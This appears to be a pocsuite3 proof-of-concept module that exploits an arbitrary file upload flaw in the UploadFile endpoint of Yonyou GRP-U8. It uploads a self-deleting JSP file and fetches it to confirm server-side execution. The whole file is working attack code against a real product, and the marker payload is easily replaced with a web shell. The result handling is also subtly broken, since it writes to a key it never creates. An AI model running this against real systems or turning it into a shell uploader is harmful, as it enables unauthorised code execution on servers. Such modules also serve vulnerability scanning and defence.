#!/usr/bin/env python
# -*- coding: utf-8 -*-
from plugin.pocsuite3.api import Output, POCBase, register_poc, requests, random_str
from plugin.pocsuite3.thirdparty.eyeJo import parse_ip_port, make_verify_url


class TestPOC(POCBase):
    vulID = ''''''
    cveID = ''''''
    cnvdID = ''''''
    cnnvdID = ''''''
    version = ''''''
    author = ''''''
    vulDate = ''''''
    createDate = ''''''
    updateDate = ''''''
    name = '''用友GRP-U8_UploadFile_file_upload'''
    desc = ''''''
    solution = ''''''
    severity = '''high'''
    vulType = '''file-upload'''
    taskType = '''app-vul'''
    references = ['''''']
    appName = '''GRP-U8'''
    appVersion = '''GRP-U8'''
    appPowerLink = ''''''
    samples = ['''''']
    install_requires = ['''''']

    def _verify(self):
        result = {}
        self.url, ip, port = parse_ip_port(self.target, 80)
        filename = random_str(5)
        vulurl = make_verify_url(self.url, "/UploadFile", mod=0)
        shell = """<%
out.println(new String(new sun.misc.BASE64Decoder().decodeBuffer("ZTE2NTQyMTExMGJhMDMwOTlhMWMwMzkzMzczYzViNDM=")));
new java.io.File(application.getRealPath(request.getServletPath())).delete();
%>"""
        uploadfiles = {'NewFile': ('%s.jsp' % filename, shell, 'application/octet-stream')}
        resp = requests.post(vulurl, files=uploadfiles, verify=False, timeout=15)
        if resp.status_code == 200 and b'success' in resp.content:
            shell_url = make_verify_url(self.url, f"/upload/{filename}.jsp", mod=0)
            respshell = requests.get(shell_url, verify=False, timeout=15)
            if respshell.status_code == 200 and b'e165421110ba03099a1c0393373c5b43' in respshell.content:
                result['VerifyInfo'] = {}
                result['ShellInfo']['URL'] = self.url
                result['VerifyInfo']['port'] = port
        return self.parse_attack(result)

    _attack = _verify

    def parse_attack(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register_poc(TestPOC)
